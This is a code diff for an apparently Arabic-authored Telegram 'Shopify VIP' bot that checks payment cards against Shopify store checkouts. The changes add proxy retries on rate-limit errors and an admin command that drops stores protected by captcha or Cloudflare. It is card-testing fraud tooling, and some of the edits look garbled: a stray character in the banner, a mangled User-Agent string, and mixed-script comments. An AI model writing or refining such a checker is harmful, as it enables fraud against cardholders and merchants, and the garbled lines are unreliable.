@@ -1,5 +1,5 @@
 # ==============================================================================
-# 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗩𝗜𝗣 𝗕𝗢𝗧 - 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗣𝗥𝗢𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗦𝗬𝗦𝗧𝗘 SYSTEM (HIGH-SPEED CPM ENGINE)
+# 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗩𝗜𝗣 𝗕𝗢𝗧 - 𝗨提𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗣𝗥𝗢𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗦𝗬𝗦𝗧𝗘 SYSTEM (HIGH-SPEED CPM ENGINE)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -84,7 +84,7 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# رابط الـ API الجديد
+# رابط الـ API
 SHOPIFY_API_URL_1 = 'https://web-production-3d364.up.railway.app/shopify'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
@@ -393,7 +393,6 @@ _LAST_SITES_FETCH = 0
 
 async def get_shopify_sites():
     global _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
-    now = time.time()
     if _CACHED_SHOPIFY_SITES: 
         return _CACHED_SHOPIFY_SITES
         
@@ -410,11 +409,12 @@ async def get_shopify_sites():
             async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10) as r:
                 if r.status == 200:
                     _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
-                    _LAST_SITES_FETCH = now
+                    _LAST_SITES_FETCH = time.time()
     except Exception: pass
     
     return _CACHED_SHOPIFY_SITES
 
+# [تحديث شامل للفلترة والقبض صراحة على الخطوط المزخرفة والعادية للـ 429 والـ 422 لإنهاء المشكلة]
 def is_dead_site_error(err):
     if not err: return True
     e = str(err).lower()
@@ -422,7 +422,8 @@ def is_dead_site_error(err):
         'step 0', 'step 0 failed', 'step 1', 'step 1 failed', 'missing stable', 'missing stablei',
         'max ret', 'cloudflare', 'timed out', 'bad gateway', 'service unavailable', 
         'gateway timeout', 'site dead', 'session_error', 'max retries', 'max retries exceeded',
-        '504', '502', '503', '429', 'tunnel', 'connection close', 'format error'
+        '504', '502', '503', '429', '𝟒𝟐𝟗', 'tunnel', 'connection close', 'format error',
+        'cart failed', '422', '𝟒𝟐𝟐', 'payment token', 'unable to get payment token', 'rate limit'
     ]
     return any(k in e for k in bad_keywords)
 
@@ -502,7 +503,7 @@ async def get_bin_info(bin_code, session=None):
         return _BIN_CACHE[b6]
         
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, Hotel/122.0.0.0 Safari/537.36"
     }
     
     try:
@@ -590,8 +591,8 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             
             rl = rm.lower()
             
-            # اقتناص أخطاء شوبفاي وبوابات الدفع ومنعها فوراً من الوصول لشرط الـ Approved
-            if any(k in rl for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token']):
+            # القبض على جميع حالات الـ 429 والـ 422 والتوكين وتوجيهها فوراً لخانة خطأ البوابة للمحاولة مجدداً ببروكسي آخر
+            if any(k in rl for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token', 'cart failed', '422', '𝟒𝟐𝟐', 'status: 429', '429', '𝟒𝟐𝟗', 'rate limit', 'too many requests']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
             
             if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare']):
@@ -655,7 +656,7 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                 lr = r
                 continue
 
-            if status == 'Rate Limit' or any(k in msg for k in ['429', '504', '405', 'gateway']):
+            if status == 'Rate Limit' or any(k in msg for k in ['429', '𝟒𝟐𝟗', '504', '405', 'gateway']):
                 await asyncio.sleep(random.uniform(1.0, 1.8))
                 lr = r
                 continue
@@ -1051,13 +1052,13 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
         except Exception: pass
 
-    # أمر حصري للآدمن: استخراج بوابات شوبفاي من الملفات المرفوعة وتجربتها للتأكد من عدم وجود كابتشا
+    # [أمر الآدمن المحمي والمحدث كلياً لحذف غير الشغال نهائياً والاعتماد الفوري على الخطة المحلية البديلة]
     elif cmd == "checkgates":
         if uid not in ADMIN_ID:
             await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n╰ {sf('This command is restricted to administrators only.')}", use_gif=True)
             return
             
-        tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Fetching and filtering gates...')}</b>", use_gif=True)
+        tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Processing and extracting gates...')}</b>", use_gif=True)
         try:
             raw_sites = []
             if update.message.reply_to_message and update.message.reply_to_message.document:
@@ -1069,34 +1070,37 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 os.remove(fp)
                 raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.split('\n') if l.strip()]))
             else:
-                async with aiohttp.ClientSession() as s:
-                    async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10) as r:
-                        if r.status == 200:
-                            content = await r.text()
-                            raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.split('\n') if l.strip()]))
-                        else:
-                            return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('Failed to fetch file from GitHub.')}</b>")
+                # محاولة السحب من GitHub وإذا تعطل الاتصال نمر فوراً وبدون خطأ لقراءة ملف sites.txt المحلي
+                try:
+                    async with aiohttp.ClientSession() as s:
+                        async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=8) as r:
+                            if r.status == 200:
+                                content = await r.text()
+                                raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.split('\n') if l.strip()]))
+                            else: raise Exception()
+                except Exception:
+                    if os.path.exists('sites.txt'):
+                        async with aiofiles.open('sites.txt', 'r', encoding='utf-8') as f:
+                            content = await f.read()
+                        raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.split('\n') if l.strip()]))
+                    else:
+                        return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('GitHub link failed and no local sites.txt found.')}</b>")
             
-            # تصفية وتجهيز المواقع الصحيحة فقط (Shopify)
             valid_format_sites = []
             for site in raw_sites:
                 site = site.lower().strip()
                 if not site or "." not in site: continue
                 site = site.split('/')[0].split('?')[0]
-                if "myshopify.com" in site:
-                    valid_format_sites.append(site)
-                elif len(site) > 4:
-                    valid_format_sites.append(site)
+                valid_format_sites.append(site)
                     
             raw_sites = list(set(valid_format_sites))
-            
             if not raw_sites:
-                return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('No valid sites found to test.')}</b>")
+                return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('No targets found to clean.')}</b>")
                 
             admin_proxies = await get_all_user_proxies(uid)
             proxies_list = list(admin_proxies) if admin_proxies else []
             
-            await styled_edit(tm, f"<b>{CE_HOURGLASS} {sf('Testing')} <code>{len(raw_sites)}</code> {sf('gates for Captcha & Errors...')}</b>")
+            await styled_edit(tm, f"<b>{CE_HOURGLASS} {sf('Purging and checking')} <code>{len(raw_sites)}</code> {sf('targets via proxies...')}</b>")
             
             working_sites = []
             dead_count = 0
@@ -1108,7 +1112,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 target_url = f"https://{site_url}/cart.json"
                 try:
                     async with session.get(target_url, proxy=p_url, timeout=6, ssl=False) as resp:
-                        # استبعاد بوابات الكابتشا أو החظر (403 = CF, 430 = Shopify Captcha, 429 = Rate Limit)
+                        # حذف فوري وتام لأي موقع يطلب كابتشا أو محمي لثبات معدل الفحص
                         if resp.status in [403, 429, 430, 502, 503, 504]:
                             captcha_count += 1
                             return
@@ -1124,21 +1128,21 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 tasks = [_validate_gate(site, test_session) for site in raw_sites]
                 await asyncio.gather(*tasks)
             
-            if working_sites:
-                async with aiofiles.open('sites.txt', 'w', encoding='utf-8') as f:
-                    await f.write('\n'.join(working_sites))
+            # الكتابة والحذف النهائي لغير الشغال نهائياً من ملف التخزين الأساسي ومزامنة الكاش
+            async with aiofiles.open('sites.txt', 'w', encoding='utf-8') as f:
+                await f.write('\n'.join(working_sites))
             
             global _CACHED_SHOPIFY_SITES
             _CACHED_SHOPIFY_SITES = working_sites
             
-            res_msg = f"""<b>{CE_CROWN} {sf('Gates Purge Completed')} {CE_PARTY}</b>
+            res_msg = f"""<b>{CE_CROWN} {sf('Purge & Clean Completed')} {CE_PARTY}</b>
             
-├ <b>{sf('Total Loaded')}:</b> <code>{sf(str(len(raw_sites)))}</code>
-├ <b>{CE_CHECK} {sf('Active & Clean')}:</b> <code>{sf(str(len(working_sites)))}</code>
-├ <b>{CE_SHIELD} {sf('Captcha/CF Blocked')}:</b> <code>{sf(str(captcha_count))}</code>
-╰ <b>{CE_CLOWN} {sf('Purged Dead')}:</b> <code>{sf(str(dead_count))}</code>
+├ <b>{sf('Total Evaluated')}:</b> <code>{sf(str(len(raw_sites)))}</code>
+├ <b>{CE_CHECK} {sf('Saved Working')}:</b> <code>{sf(str(len(working_sites)))}</code>
+├ <b>{CE_SHIELD} {sf('Removed Captcha/CF')}:</b> <code>{sf(str(captcha_count))}</code>
+╰ <b>{CE_CLOWN} {sf('Deleted Dead')}:</b> <code>{sf(str(dead_count))}</code>
 
-<i>{sf('Sites saved and applied permanently!')}</i>"""
+<i>{sf('Non-working elements dropped permanently from database!')}</i>"""
             await styled_edit(tm, res_msg)
             
         except Exception as e:
